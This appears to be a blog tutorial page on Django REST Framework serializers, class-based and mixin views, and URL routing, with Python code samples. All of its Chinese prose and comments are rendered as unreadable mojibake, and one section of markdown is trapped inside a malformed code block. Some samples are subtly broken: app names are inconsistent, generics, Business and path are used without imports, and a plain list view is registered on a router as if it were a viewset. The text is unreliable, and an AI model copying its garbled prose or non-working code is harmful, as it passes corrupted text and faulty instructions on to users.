&quot;latest_question_list&quot;: latest_question_list,&#125;</code></li><li><code>return HttpResponse(template.render(context, request))</code></li></ul></li></ul><hr><h3 id="Serialize"><a href="#Serialize" class="headerlink" title="Serialize"></a>Serialize</h3><h4 id="å‰ç½®å‡†å¤‡"><a href="#å‰ç½®å‡†å¤‡" class="headerlink" title="å‰ç½®å‡†å¤‡"></a>å‰ç½®å‡†å¤‡</h4><ul><li>åˆ›å»ºåº”ç”¨  <code>django-admin.py startproject test_app</code></li><li>å°†æ–°å»ºçš„<code>snippets</code>appå’Œ<code>rest_framework</code>appæ·»åŠ åˆ° <code>settings.py</code> ä¸­çš„<code>INSTALLED_APPS</code></li><li>åˆ›å»º <code>module</code></li><li>ä¸º <code>module</code> åˆ›å»ºåˆå§‹è¿ç§»å¹¶åŒæ­¥æ•°æ®åº“</li></ul><h4 id="åˆ›å»ºåºåˆ—åŒ–ç±»"><a href="#åˆ›å»ºåºåˆ—åŒ–ç±»" class="headerlink" title="åˆ›å»ºåºåˆ—åŒ–ç±»"></a>åˆ›å»ºåºåˆ—åŒ–ç±»</h4><p>å¼€å‘æˆ‘ä»¬çš„ Web API çš„ç¬¬ä¸€ä»¶äº‹æ˜¯ä¸ºæˆ‘ä»¬çš„ Web API æä¾›ä¸€ç§å°†ä»£ç ç‰‡æ®µå®ä¾‹åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸ºè¯¸å¦‚<code>json</code>ä¹‹ç±»çš„è¡¨ç¤ºå½¢å¼çš„æ–¹å¼ã€‚å¯ä»¥é€šè¿‡å£°æ˜ä¸ Django forms éå¸¸ç›¸ä¼¼çš„åºåˆ—åŒ–å™¨ï¼ˆserializersï¼‰æ¥å®ç°ã€‚ åœ¨<code>test_app</code>çš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º<code>serializers.py</code>æ–‡ä»¶ï¼Œå¹¶æ·»åŠ å†…å®¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> serializers</span><br><span class="line"><span class="keyword">from</span> test_app.models <span class="keyword">import</span> Snippet, LANGUAGE_CHOICES, STYLE_CHOICES</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SnippetSerializer</span>(serializers.Serializer):</span><br><span class="line">    <span class="built_in">id</span> = serializers.IntegerField(read_only=<span class="literal">True</span>)</span><br><span class="line">    title = serializers.CharField(required=<span class="literal">False</span>, allow_blank=<span class="literal">True</span>, max_length=<span class="number">100</span>)</span><br><span class="line">    code = serializers.CharField(style=&#123;<span class="string">&#x27;base_template&#x27;</span>: <span class="string">&#x27;textarea.html&#x27;</span>&#125;)</span><br><span class="line">    linenos = serializers.BooleanField(required=<span class="literal">False</span>)</span><br><span class="line">    language = serializers.ChoiceField(choices=LANGUAGE_CHOICES, default=<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line">    style = serializers.ChoiceField(choices=STYLE_CHOICES, default=<span class="string">&#x27;friendly&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">self, validated_data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        æ ¹æ®æä¾›çš„éªŒè¯è¿‡çš„æ•°æ®åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªæ–°çš„`Snippet`å®ä¾‹ã€‚</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> Snippet.objects.create(**validated_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, instance, validated_data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        æ ¹æ®æä¾›çš„éªŒè¯è¿‡çš„æ•°æ®æ›´æ–°å’Œè¿”å›ä¸€ä¸ªå·²ç»å­˜åœ¨çš„`Snippet`å®ä¾‹ã€‚</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        instance.title = validated_data.get(<span class="string">&#x27;title&#x27;</span>, instance.title)</span><br><span class="line">        instance.code = validated_data.get(<span class="string">&#x27;code&#x27;</span>, instance.code)</span><br><span class="line">        instance.linenos = validated_data.get(<span class="string">&#x27;linenos&#x27;</span>, instance.linenos)</span><br><span class="line">        instance.language = validated_data.get(<span class="string">&#x27;language&#x27;</span>, instance.language)</span><br><span class="line">        instance.style = validated_data.get(<span class="string">&#x27;style&#x27;</span>, instance.style)</span><br><span class="line">        instance.save()</span><br><span class="line">        <span class="keyword">return</span> instance</span><br></pre></td></tr></table></figure><ul><li>åºåˆ—åŒ–å™¨ç±»çš„ç¬¬ä¸€éƒ¨åˆ†å®šä¹‰äº†åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–çš„å­—æ®µã€‚</li><li><code>create()</code>å’Œ<code>update()</code>æ–¹æ³•å®šä¹‰äº†åœ¨è°ƒç”¨<code>serializer.save()</code>æ—¶å¦‚ä½•åˆ›å»ºå’Œä¿®æ”¹å®Œæ•´çš„å®ä¾‹ã€‚</li></ul><h4 id="ä½¿ç”¨ModelSerializer"><a href="#ä½¿ç”¨ModelSerializer" class="headerlink" title="ä½¿ç”¨ModelSerializer"></a>ä½¿ç”¨<code>ModelSerializer</code></h4><ul><li>å…ˆè¿›å…¥ Django shell æ¥ç†Ÿæ‚‰ä¸€ä¸‹ <code>Serializer</code> ç±»ï¼š<code>python manage.py shell</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">from</span> app_test.models <span class="keyword">import</span> Snippet</span><br><span class="line">&gt;<span class="keyword">from</span> app_test.serializers <span class="keyword">import</span> SnippetSerializer</span><br><span class="line">&gt;<span class="keyword">from</span> rest_framework.renderers <span class="keyword">import</span> JSONRenderer</span><br><span class="line">&gt;<span class="keyword">from</span> rest_framework.parsers <span class="keyword">import</span> JSONParser</span><br><span class="line"></span><br><span class="line">&gt;snippet = Snippet(code=<span class="string">&#x27;foo = &quot;bar&quot;\\n&#x27;</span>)</span><br><span class="line">&gt;snippet.save()</span><br><span class="line"></span><br><span class="line">&gt;snippet = Snippet(code=<span class="string">&#x27;print &quot;hello, world&quot;\\n&#x27;</span>)</span><br><span class="line">&gt;snippet.save()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†å…¶ä¸­çš„ç‰‡æ®µå®ä¾‹åŒ–</span></span><br><span class="line">&gt;serializer = SnippetSerializer(snippet)</span><br><span class="line">&gt;serializer.data</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> &#123;&#x27;id&#x27;: 2, &#x27;title&#x27;: u&#x27;&#x27;, &#x27;code&#x27;: u&#x27;print &quot;hello, world&quot;\\n&#x27;, &#x27;linenos&#x27;: False, &#x27;language&#x27;: u&#x27;python&#x27;, &#x27;style&#x27;: u&#x27;friendly&#x27;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­¤æ—¶ï¼Œå°†æ¨¡å‹å®ä¾‹è½¬æ¢ä¸ºPythonåŸç”Ÿæ•°æ®ç±»å‹ã€‚è¦å®Œæˆåºåˆ—åŒ–è¿‡ç¨‹ï¼Œæˆ‘ä»¬å°†æ•°æ®è½¬æ¢æˆjsonã€‚</span></span><br><span class="line">&gt;content = JSONRenderer().render(serializer.data)</span><br><span class="line">&gt;content</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> b&#x27;&#123;&quot;id&quot;: 2, &quot;title&quot;: &quot;&quot;, &quot;code&quot;: &quot;print(\\\\&quot;hello, world\\\\&quot;)\\\\n&quot;, &quot;linenos&quot;: false, &quot;language&quot;: &quot;python&quot;, &quot;style&quot;: &quot;friendly&quot;&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>REST frameworkåŒ…æ‹¬<code>Serializer</code>ç±»å’Œ<code>ModelSerializer</code>ç±»ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹ä½¿ç”¨<code>ModelSerializer</code>ç±»é‡æ„æˆ‘ä»¬çš„åºåˆ—åŒ–ç±»ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡æ„ serializers.py æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SnippetSerializer</span>(serializers.ModelSerializer):</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        model = Snippet</span><br><span class="line">        fields = (<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;linenos&#x27;</span>, <span class="string">&#x27;language&#x27;</span>, <span class="string">&#x27;style&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>ModelSerializer</code>ç±»å¹¶ä¸ä¼šåšä»»ä½•ç‰¹åˆ«ç¥å¥‡çš„äº‹æƒ…ï¼Œå®ƒä»¬åªæ˜¯åˆ›å»ºåºåˆ—åŒ–å™¨ç±»çš„å¿«æ·æ–¹å¼ï¼š</p><ul><li>ä¸€ç»„è‡ªåŠ¨ç¡®å®šçš„å­—æ®µã€‚</li><li>é»˜è®¤ç®€å•å®ç°çš„<code>create()</code>å’Œ<code>update()</code>æ–¹æ³•ã€‚</li></ul><h4 id="ç¼–å†™-Django-è§†å›¾"><a href="#ç¼–å†™-Django-è§†å›¾" class="headerlink" title="ç¼–å†™ Django è§†å›¾"></a>ç¼–å†™ Django è§†å›¾</h4><ul><li><p>åŸºäºè§†å›¾</p><ul><li><p>åœ¨ <code>views.py</code> ä¸­æ·»åŠ ä»£ç ï¼ŒåŸºäºç±»çš„è§†å›¾é‡æ„ API ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app_test.models <span class="keyword">import</span> Snippet</span><br><span class="line"><span class="keyword">from</span> app_test.serializers <span class="keyword">import</span> SnippetSerializer</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> Http404</span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸºäºç±»çš„è§†å›¾</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SnippetList</span>(<span class="title class_ inherited__">APIView</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    åˆ—å‡ºæ‰€æœ‰çš„snippetsæˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°çš„snippetã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, request, <span class="built_in">format</span>=<span class="literal">None</span></span>):</span><br><span class="line">        snippets = Snippet.objects.<span class="built_in">all</span>()</span><br><span class="line">        serializer = SnippetSerializer(snippets, many=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> Response(serializer.data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, request, <span class="built_in">format</span>=<span class="literal">None</span></span>):</span><br><span class="line">        serializer = SnippetSerializer(data=request.data)</span><br><span class="line">        <span class="keyword">if</span> serializer.is_valid():</span><br><span class="line">            serializer.save()</span><br><span class="line">            <span class="keyword">return</span> Response(serializer.data, status=status.HTTP_201_CREATED)</span><br><span class="line">        <span class="keyword">return</span> Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)</span><br></pre></td></tr></table></figure></li><li><p>æ ¹URLé…ç½®<code>/urls.py</code>æ–‡ä»¶ä¸­ï¼Œæ·»åŠ æˆ‘ä»¬çš„ app_test åº”ç”¨çš„URLã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url, include</span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r&#x27;^&#x27;</span>, include(<span class="string">&#x27;app_test.urls&#x27;</span>)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul></li><li><p>åŸºäºæ··åˆ(mixins)</p><ul><li><p>ä½¿ç”¨åŸºäºç±»è§†å›¾çš„æœ€å¤§ä¼˜åŠ¿ä¹‹ä¸€æ˜¯å®ƒå¯ä»¥è½»æ¾åœ°åˆ›å»ºå¯å¤ç”¨çš„è¡Œä¸ºã€‚è¿™äº›éƒ½æ˜¯åœ¨RESTæ¡†æ¶çš„mixinç±»ä¸­å®ç°çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app_test.models <span class="keyword">import</span> Snippet</span><br><span class="line"><span class="keyword">from</span> app_test.serializers <span class="keyword">import</span> SnippetSerializer</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> mixins</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> generics</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SnippetList</span>(mixins.ListModelMixin,</span><br><span class="line">                  mixins.CreateModelMixin,</span><br><span class="line">                  generics.GenericAPIView):</span><br><span class="line">    queryset = Snippet.objects.<span class="built_in">all</span>()</span><br><span class="line">    serializer_class = SnippetSerializer</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, request, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">list</span>(request, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, request, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">return</span> self.create(request, *args, **kwargs)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>é€šè¿‡ä½¿ç”¨ mixin ç±»ï¼Œæˆ‘ä»¬ä½¿ç”¨æ›´å°‘çš„ä»£ç é‡å†™äº†è¿™äº›è§†å›¾ï¼Œä½†æˆ‘ä»¬è¿˜å¯ä»¥å†è¿›ä¸€æ­¥ã€‚RESTæ¡†æ¶æä¾›äº†ä¸€ç»„å·²ç»æ··åˆå¥½ï¼ˆmixed-inï¼‰çš„é€šç”¨è§†å›¾ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app_test.models <span class="keyword">import</span> Snippet</span><br><span class="line"><span class="keyword">from</span> app_test.serializers <span class="keyword">import</span> SnippetSerializer</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> generics</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SnippetList</span>(generics.ListCreateAPIView):</span><br><span class="line">    queryset = Snippet.objects.<span class="built_in">all</span>()</span><br><span class="line">    serializer_class = SnippetSerializer</span><br></pre></td></tr></table></figure><ul><li><p>è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨å¿«é€Ÿå¼€å§‹é‚£é‡Œä½¿ç”¨çš„è§†å›¾äº†ã€‚</p></li><li><pre><code>ModelSerializer<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ä¸å¸¸è§„çš„ </span><br><span class="line"></span><br></pre></td></tr></table></figure>Serializer<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">     ç›¸åŒï¼Œä½†æä¾›äº†ï¼š</span><br><span class="line"></span><br><span class="line">    - åŸºäºæ¨¡å‹ç±»â¾ƒåŠ¨â½£æˆâ¼€ç³»åˆ—å­—æ®µ</span><br><span class="line">    - åŸºäºæ¨¡å‹ç±»â¾ƒåŠ¨ä¸º `Serializer` â½£æˆ `validators`ï¼Œâ½å¦‚ `unique_together`</span><br><span class="line">    - åŒ…å«é»˜è®¤çš„`create()`å’Œ`update()`çš„å®ç°</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">### **Django REST Framework(DRF)**</span><br><span class="line"></span><br><span class="line">#### æ–‡æ¡£</span><br><span class="line"></span><br><span class="line">&gt; ä¸­æ–‡æ–‡æ¡£ï¼š</span><br><span class="line">&gt;</span><br><span class="line">&gt; https://q1mi.github.io/Django-REST-framework-documentation/</span><br><span class="line"></span><br><span class="line">#### RESTful API</span><br><span class="line"></span><br><span class="line">&gt; RESTå…¨ç§°æ˜¯Representational State Transferï¼Œä¸­â½‚æ„æ€æ˜¯è¡¨è¿°ï¼ˆç¼–è€…æ³¨ï¼šé€šå¸¸è¯‘ä¸ºè¡¨å¾ï¼‰æ€§çŠ¶æ€è½¬ç§»ã€‚ â¾¸æ¬¡å‡º ç°åœ¨2000å¹´Roy Fieldingçš„åšâ¼ è®ºâ½‚ä¸­ã€‚è¿™ç§â»›æ ¼çš„ç†å¿µè®¤ä¸ºåç«¯å¼€å‘ä»»åŠ¡å°±æ˜¯æä¾›æ•°æ®çš„ï¼Œå¯¹å¤–æä¾›çš„æ˜¯æ•°æ®èµ„æºçš„è®¿é—®æ¥â¼ï¼Œæ‰€ä»¥åœ¨å®šä¹‰æ¥â¼æ—¶ï¼Œå®¢æˆ·ç«¯è®¿é—®çš„URLè·¯å¾„å°±è¡¨ç¤ºè¿™ç§è¦æ“ä½œçš„æ•°æ®èµ„æºã€‚</span><br><span class="line"></span><br><span class="line">- RESTful æ˜¯â¼€ç§ä¸“â»”ä¸ºWeb å¼€å‘â½½å®šä¹‰APIæ¥â¼çš„è®¾è®¡â»›æ ¼ï¼Œå°¤å…¶é€‚â½¤äºå‰åç«¯åˆ†ç¦»çš„åº”â½¤æ¨¡å¼ä¸­ã€‚</span><br><span class="line">- â½½å¯¹äºæ•°æ®èµ„æºåˆ†åˆ«ä½¿â½¤ POSTã€DELETEã€GETã€UPDATE ç­‰è¯·æ±‚åŠ¨ä½œæ¥è¡¨è¾¾å¯¹æ•°æ®çš„å¢åˆ æŸ¥æ”¹ã€‚</span><br><span class="line"></span><br><span class="line">#### å¿«é€Ÿå…¥é—¨</span><br><span class="line"></span><br><span class="line">##### Serialize</span><br><span class="line"></span><br><span class="line">é¦–å…ˆéœ€è¦å®šä¹‰ä¸€äº›åºåˆ—åŒ–ç¨‹åºã€‚åœ¨å¯¹åº” app ä¸‹åˆ›å»ºåä¸ºï¼š`app/serializres.py` çš„æ–‡ä»¶ï¼Œç”¨ä½œæˆ‘ä»¬çš„æ•°æ®è¡¨ç¤ºã€‚ä¹Ÿå¯ä»¥ç†è§£ä¸ºâ½¤äºä¿å­˜è¯¥åº”â½¤çš„åºåˆ—åŒ–å™¨</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"># serializers.py</span><br><span class="line"></span><br><span class="line"># å¼•å…¥åºåˆ—åŒ–æ¨¡å—</span><br><span class="line">from rest_framework import serializers</span><br><span class="line"># å¼•å…¥è‡ªå»ºæ¨¡å‹</span><br><span class="line">from .models import Host, Business</span><br><span class="line"></span><br><span class="line"># åˆ›å»ºåºåˆ—åŒ–ç±»</span><br><span class="line">class HostModelSerializer(serializers.ModelSerializer):</span><br><span class="line">    class Meta:</span><br><span class="line">        model = Host</span><br><span class="line">        fields = [</span><br><span class="line">            &quot;bk_host_id&quot;,</span><br><span class="line">             Â·Â·Â·</span><br><span class="line">            &quot;operator&quot;,</span><br><span class="line">        ]</span><br><span class="line">        # ä¹Ÿå¯ä»¥ç›´æ¥ï¼šfields = &quot;__all__&quot;</span><br><span class="line"></span><br><span class="line">class BusinessModelSerializer(serializers.ModelSerializer):</span><br><span class="line">    class Meta:</span><br><span class="line">        model = Business</span><br><span class="line">        fields = [&quot;bk_biz_id&quot;, &quot;bk_biz_name&quot;]</span><br></pre></td></tr></table></figure></code></pre></li></ul></li><li><p><code>model</code> æŒ‡æ˜è¯¥åºåˆ—åŒ–å™¨å¤„ç†çš„æ•°æ®å­—æ®µä»æ¨¡å‹ç±»Studentå‚è€ƒâ½£æˆ</p></li><li><p><code>fields</code> æŒ‡æ˜è¯¥åºåˆ—åŒ–å™¨åŒ…å«æ¨¡å‹ç±»ä¸­çš„å“ªäº›å­—æ®µï¼Œâ€™allâ€˜æŒ‡æ˜åŒ…å«æ‰€æœ‰å­—æ®µ</p></li></ul><h5 id="Views"><a href="#Views" class="headerlink" title="Views"></a>Views</h5><p>æ¥ä¸‹æ¥åˆ›å»ºåœ¨ views ä¸­çš„è§†å›¾ï¼Œä½¿ç”¨æˆ‘ä»¬åºåˆ—åŒ–çš„ç±»åˆ›å»º RESTful API</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># views.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼•å…¥rest_frameworkæ¨¡å—</span></span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> viewsets</span><br><span class="line"><span class="comment"># å¼•å…¥è‡ªå»ºåºåˆ—åŒ–ç±»</span></span><br><span class="line"><span class="keyword">from</span> .serializers <span class="keyword">import</span> BusinessModelSerializer, HostModelSerializer</span><br><span class="line"></span><br><span class="line"><span class="comment"># search business</span></span><br><span class="line"><span class="comment"># åŸæ¥å†™æ³•</span></span><br><span class="line"><span class="comment"># def search_business(request):</span></span><br><span class="line"><span class="comment">#     business_objects = Business.objects.all()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     business_list = [</span></span><br><span class="line"><span class="comment">#         &#123;&quot;bk_biz_id&quot;: business.bk_biz_id, &quot;bk_biz_name&quot;: business.bk_biz_name&#125;</span></span><br><span class="line"><span class="comment">#         for business in business_objects</span></span><br><span class="line"><span class="comment">#     ]</span></span><br><span class="line"><span class="comment">#     return JsonResponse(&#123;&quot;business&quot;: business_list&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨åºåˆ—åŒ–å™¨</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BusinessListView</span>(generics.ListAPIView):</span><br><span class="line"></span><br><span class="line">    queryset = Business.objects.<span class="built_in">all</span>()</span><br><span class="line">    pagination_class = <span class="literal">None</span></span><br><span class="line">    serializer_class = BusinessModelSerializer</span><br></pre></td></tr></table></figure><ul><li><code>queryset</code> æŒ‡æ˜è¯¥è§†å›¾é›†åœ¨æŸ¥è¯¢æ•°æ®æ—¶ä½¿â½¤çš„æŸ¥è¯¢é›†</li><li><code>serializer_class</code> æŒ‡æ˜è¯¥è§†å›¾åœ¨è¿›â¾åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–æ—¶ä½¿â½¤çš„åºåˆ—åŒ–å™¨</li></ul><h5 id="URLs"><a href="#URLs" class="headerlink" title="URLs"></a>URLs</h5><p>åœ¨<code>app/urls.py</code>ä¸­å¼€å§‹å®šä¹‰è·¯ç”± ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url, include</span><br><span class="line"><span class="keyword">from</span> rest_framework.routers <span class="keyword">import</span> DefaultRouter</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ä»¥å¤„ç†è§†å›¾çš„è·¯ç”±å™¨</span></span><br><span class="line">router = DefaultRouter()    </span><br><span class="line"><span class="comment"># å‘è·¯ç”±å™¨ä¸­æ³¨å†Œè§†å›¾é›†</span></span><br><span class="line">router.register(<span class="string">r&#x27;businesslist&#x27;</span>, views.BusinessListView)</span><br><span class="line"></span><br><span class="line"><span class="comment"># import</span></span><br><span class="line"><span class="keyword">from</span> host_query.views <span class="keyword">import</span> (</span><br><span class="line">    BusinessListView</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†è·¯ç”±å™¨ä¸­çš„æ‰€ä»¥è·¯ç”±ä¿¡æ¯æ·»åŠ åˆ°djangoçš„è·¯ç”±åˆ—è¡¨ä¸­</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">  path(<span class="string">&quot;business_list/&quot;</span>, BusinessListView.as_view()),     <span class="comment"># ä¸çŸ¥é“ä¸ºä»€ä¹ˆä½†æ˜¯å»ºè®®åŠ ä¸Šæœ€åçš„ / å¦åˆ™ä¸€ç›´ 404</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>å› 